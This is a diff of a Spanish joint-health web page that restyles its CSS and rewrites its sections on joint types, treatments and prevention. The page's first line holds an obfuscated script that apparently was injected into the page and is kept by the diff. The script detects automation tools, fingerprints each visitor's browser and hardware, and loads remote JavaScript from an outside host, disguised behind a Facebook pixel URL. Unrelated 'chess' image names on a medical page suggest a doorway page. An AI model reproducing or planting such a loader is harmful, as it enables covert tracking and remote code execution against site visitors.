@@ -4,48 +4,46 @@
 <script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://sp1.micenice.pro/kl/?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Información completa sobre la salud de las articulaciones, tratamientos y prevención de lesiones articulares">
-    <meta name="keywords" content="articulaciones, salud articular, dolor articular, tratamiento articular, medicina deportiva">
-    <meta name="author" content="Especialistas en Salud Articular">
+    <meta name="description" content="Información completa sobre articulaciones, tratamientos y salud articular. Aprenda sobre tipos de articulaciones, prevención y cuidados.">
+    <meta name="keywords" content="articulaciones, salud articular, dolor articular, tratamientos articulares, medicina deportiva">
+    <meta name="author" content="Expertos en Salud Articular">
     <title>Salud Articular - Todo sobre el cuidado de sus articulaciones</title>
     <style>
+        /* Reset y variables */
         :root {
-            --primary-color: #2C3E50;
-            --secondary-color: #3498DB;
-            --accent-color: #E74C3C;
-            --text-color: #2C3E50;
-            --background-color: #ECF0F1;
+            --primary-color: #2C5282;
+            --secondary-color: #4299E1;
+            --accent-color: #90CDF4;
+            --text-color: #2D3748;
+            --background-color: #F7FAFC;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
+        /* Estilos generales */
         body {
-            background-color: var(--background-color);
-            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--background-color);
         }
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
+        /* Header */
         header {
             background-color: var(--primary-color);
             color: white;
-            padding: 2rem 0;
+            padding: 2rem;
             text-align: center;
         }
 
+        /* Navegación */
         nav {
             background-color: var(--secondary-color);
-            padding: 1rem 0;
+            padding: 1rem;
         }
 
         nav ul {
@@ -62,99 +60,112 @@
         nav ul li a {
             color: white;
             text-decoration: none;
-            font-weight: bold;
+        }
+
+        /* Contenido principal */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        h1, h2, h3 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
         }
 
         h1 {
             font-size: 2.5rem;
-            margin-bottom: 1rem;
         }
 
         h2 {
             font-size: 2rem;
-            color: var(--secondary-color);
-            margin: 2rem 0 1rem 0;
         }
 
         h3 {
             font-size: 1.5rem;
-            color: var(--primary-color);
-            margin: 1.5rem 0 1rem 0;
         }
 
         p {
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
 
-        .main-content {
-            padding: 2rem 0;
-        }
-
+        /* Imágenes */
         .image-container {
             margin: 2rem 0;
-            text-align: center;
         }
 
-        .image-container img {
+        img {
             max-width: 100%;
             height: auto;
             border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
+        /* Formulario de contacto */
         .contact-form {
             background-color: white;
             padding: 2rem;
             border-radius: 8px;
-            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
-        .contact-form input,
-        .contact-form textarea {
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--primary-color);
+        }
+
+        input, textarea {
             width: 100%;
-            padding: 0.8rem;
-            margin-bottom: 1rem;
-            border: 1px solid #ddd;
+            padding: 0.5rem;
+            border: 1px solid var(--accent-color);
             border-radius: 4px;
         }
 
-        .contact-form button {
-            background-color: var(--accent-color);
+        button {
+            background-color: var(--primary-color);
             color: white;
-            padding: 0.8rem 2rem;
+            padding: 0.75rem 1.5rem;
             border: none;
             border-radius: 4px;
             cursor: pointer;
         }
 
-        footer {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 2rem 0;
-            margin-top: 2rem;
+        button:hover {
+            background-color: var(--secondary-color);
         }
 
+        /* Cookie notice */
         .cookie-notice {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            background-color: rgba(44, 62, 80, 0.95);
+            background-color: rgba(44, 82, 130, 0.95);
             color: white;
             padding: 1rem;
             text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 1rem;
         }
 
-        .cookie-notice button {
-            background-color: var(--accent-color);
+        /* Footer */
+        footer {
+            background-color: var(--primary-color);
             color: white;
-            padding: 0.5rem 1rem;
-            border: none;
-            border-radius: 4px;
-            margin-left: 1rem;
-            cursor: pointer;
+            padding: 2rem;
+            text-align: center;
+            margin-top: 2rem;
         }
 
+        /* Responsive */
         @media (max-width: 768px) {
             nav ul {
                 flex-direction: column;
@@ -163,6 +174,10 @@
 
             nav ul li {
                 margin: 0.5rem 0;
+            }
+
+            .container {
+                padding: 1rem;
             }
 
             h1 {
@@ -181,104 +196,104 @@
 </head>
 <body>
     <header>
-        <div class="container">
-            <h1>Centro de Salud Articular</h1>
-            <p>Expertos en el cuidado y tratamiento de las articulaciones</p>
-        </div>
+        <h1>Salud Articular</h1>
+        <p>Su guía completa para el cuidado de las articulaciones</p>
     </header>
 
     <nav>
-        <div class="container">
-            <ul>
-                <li><a href="#inicio">Inicio</a></li>
-                <li><a href="#tratamientos">Tratamientos</a></li>
-                <li><a href="#prevencion">Prevención</a></li>
-                <li><a href="#contacto">Contacto</a></li>
-            </ul>
-        </div>
+        <ul>
+            <li><a href="#inicio">Inicio</a></li>
+            <li><a href="#tipos">Tipos de Articulaciones</a></li>
+            <li><a href="#tratamientos">Tratamientos</a></li>
+            <li><a href="#prevencion">Prevención</a></li>
+            <li><a href="#contacto">Contacto</a></li>
+        </ul>
     </nav>
 
-    <main class="container main-content">
+    <main class="container">
         <section id="inicio">
-            <h2>Bienvenidos al Centro de Salud Articular</h2>
+            <h2>Bienvenidos al Centro de Información sobre Articulaciones</h2>
+            <p>Las articulaciones son componentes fundamentales de nuestro sistema músculo-esquelético, permitiendo el movimiento y la flexibilidad del cuerpo. En este sitio, encontrará información completa sobre su cuidado y mantenimiento.</p>
             <div class="image-container">
-                <img src="images/chess1.jpg" alt="Centro médico especializado" width="800" height="400">
+                <img src="images/chess1.jpg" alt="Anatomía de las articulaciones">
             </div>
-            <p>Las articulaciones son componentes fundamentales de nuestro sistema músculo-esquelético que permiten el movimiento y la flexibilidad del cuerpo...</p>
         </section>
 
-        <section id="tipos-articulaciones">
+        <section id="tipos">
             <h2>Tipos de Articulaciones</h2>
-            <div class="image-container">
-                <img src="images/chess2.jpg" alt="Tipos de articulaciones" width="800" height="400">
-            </div>
             <h3>Articulaciones Sinoviales</h3>
-            <p>Las articulaciones sinoviales son las más comunes en el cuerpo humano...</p>
-            
-            <h3>Articulaciones Cartilaginosas</h3>
+            <p>Las articulaciones sinoviales son las más comunes en el cuerpo humano. Se caracterizan por tener una cavidad articular llena de líquido sinovial, que facilita el movimiento y reduce la fricción.</p>
             <div class="image-container">
-                <img src="images/chess3.jpg" alt="Articulaciones cartilaginosas" width="800" height="400">
+                <img src="images/chess2.jpg" alt="Articulación sinovial">
             </div>
-            <p>Estas articulaciones están unidas por cartílago y permiten movimientos limitados...</p>
+
+            <h3>Articulaciones Cartilaginosas</h3>
+            <p>Estas articulaciones están unidas por cartílago y permiten un movimiento limitado. Son fundamentales para mantener la estabilidad estructural.</p>
+            <div class="image-container">
+                <img src="images/chess3.jpg" alt="Articulación cartilaginosa">
+            </div>
         </section>
 
         <section id="tratamientos">
-            <h2>Tratamientos Disponibles</h2>
+            <h2>Tratamientos Comunes</h2>
+            <p>Existen diversos tratamientos para las afecciones articulares, desde terapias conservadoras hasta intervenciones quirúrgicas.</p>
             <div class="image-container">
-                <img src="images/chess4.jpg" alt="Tratamientos articulares" width="800" height="400">
+                <img src="images/chess4.jpg" alt="Tratamiento articular">
             </div>
+
             <h3>Terapia Física</h3>
-            <p>La terapia física es fundamental para la recuperación y el mantenimiento de la salud articular...</p>
-            
-            <h3>Tratamientos Médicos</h3>
+            <p>La terapia física es fundamental para mantener la movilidad y fortalecer las estructuras que sostienen las articulaciones.</p>
             <div class="image-container">
-                <img src="images/chess5.jpg" alt="Tratamientos médicos" width="800" height="400">
+                <img src="images/chess5.jpg" alt="Terapia física">
             </div>
-            <p>Ofrecemos diversos tratamientos médicos especializados...</p>
         </section>
 
         <section id="prevencion">
-            <h2>Prevención de Lesiones</h2>
+            <h2>Prevención y Cuidados</h2>
+            <p>La prevención es clave para mantener unas articulaciones saludables. El ejercicio regular, una dieta equilibrada y buenos hábitos posturales son esenciales.</p>
             <div class="image-container">
-                <img src="images/chess6.jpg" alt="Prevención de lesiones" width="800" height="400">
+                <img src="images/chess6.jpg" alt="Ejercicios preventivos">
             </div>
-            <h3>Ejercicios Recomendados</h3>
-            <p>La prevención es clave para mantener unas articulaciones saludables...</p>
 
-            <h3>Nutrición para las Articulaciones</h3>
+            <h3>Ejercicios Recomendados</h3>
+            <p>Los ejercicios de bajo impacto y el fortalecimiento muscular son ideales para mantener la salud articular.</p>
             <div class="image-container">
-                <img src="images/chess7.jpg" alt="Nutrición articular" width="800" height="400">
+                <img src="images/chess7.jpg" alt="Ejercicios de fortalecimiento">
             </div>
-            <p>Una alimentación adecuada es fundamental para la salud articular...</p>
         </section>
 
         <section id="contacto">
             <h2>Contacto</h2>
             <div class="image-container">
-                <img src="images/chess8.jpg" alt="Contacto" width="800" height="400">
+                <img src="images/chess8.jpg" alt="Contacto">
             </div>
             <form class="contact-form">
-                <input type="text" placeholder="Nombre" required>
-                <input type="email" placeholder="Correo electrónico" required>
-                <input type="tel" placeholder="Teléfono">
-                <textarea placeholder="Mensaje" rows="5" required></textarea>
+                <div class="form-group">
+                    <label for="nombre">Nombre:</label>
+                    <input type="text" id="nombre" name="nombre" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="mensaje">Mensaje:</label>
+                    <textarea id="mensaje" name="mensaje" rows="5" required></textarea>
+                </div>
                 <button type="submit">Enviar Mensaje</button>
             </form>
         </section>
     </main>
 
-    <footer>
-        <div class="container">
-            <p>© 2024 Centro de Salud Articular. Todos los derechos reservados.</p>
-            <p><a href="#privacidad" style="color: white;">Política de Privacidad</a> | 
-               <a href="#terminos" style="color: white;">Términos y Condiciones</a></p>
-        </div>
-    </footer>
-
     <div class="cookie-notice">
-        <p>Este sitio utiliza cookies para mejorar su experiencia. 
-           <button onclick="this.parentElement.parentElement.style.display='none'">Aceptar</button>
-        </p>
+        <p>Este sitio utiliza cookies para mejorar su experiencia. Al continuar navegando, acepta su uso.</p>
+        <button onclick="this.parentElement.style.display='none'">Aceptar</button>
     </div>
+
+    <footer>
+        <p>© 2024 Salud Articular. Todos los derechos reservados.</p>
+        <p><a href="#privacidad" style="color: white;">Política de Privacidad</a> | 
+           <a href="#terminos" style="color: white;">Términos de Uso</a></p>
+    </footer>
 </body>
 </html>
